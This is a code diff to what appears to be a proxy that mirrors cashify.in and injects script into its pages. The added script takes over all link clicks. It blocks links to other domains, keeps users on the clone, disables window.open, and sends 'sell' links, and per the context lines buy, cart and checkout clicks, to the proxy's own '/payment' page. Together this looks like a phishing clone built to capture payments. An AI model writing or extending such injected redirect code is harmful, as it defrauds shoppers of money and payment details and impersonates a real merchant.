@@ -755,15 +755,34 @@ app.use(
 
                    [500, 1500, 3000, 5000].forEach(t => setTimeout(runAll, t));
 
-                   // Intercept sell link clicks → /payment
+                   // ── Intercept ALL clicks: block external/ads, sell → /payment ──
                    document.addEventListener('click', function(e) {
                      const a = e.target.closest('a');
-                     if (a && a.href && /\\/sell|\\/selling/i.test(new URL(a.href).pathname)) {
-                       e.preventDefault();
-                       e.stopPropagation();
-                       window.location.href = '/payment';
-                     }
+                     if (!a || !a.href) return;
+                     try {
+                       const url = new URL(a.href);
+                       // 1. External domain (ads, trackers, etc.) → block completely
+                       if (url.hostname && url.hostname !== window.location.hostname) {
+                         e.preventDefault();
+                         e.stopImmediatePropagation();
+                         // If it's a cashify.in link, stay on our proxy with same path
+                         if (url.hostname.includes('cashify')) {
+                           window.location.href = url.pathname + url.search;
+                         }
+                         return false;
+                       }
+                       // 2. Sell links → /payment
+                       if (/\/sell|\/selling/i.test(url.pathname)) {
+                         e.preventDefault();
+                         e.stopImmediatePropagation();
+                         window.location.href = '/payment';
+                         return false;
+                       }
+                     } catch(err) {}
                    }, true);
+
+                   // ── Block window.open (ad popups / new tab redirects) ──
+                   window.open = function() { return null; };
 
                    // ── Intercept buy/cart/checkout clicks → /payment ──
                    // ONLY intercept actual CTA buttons, NOT product card navigation links
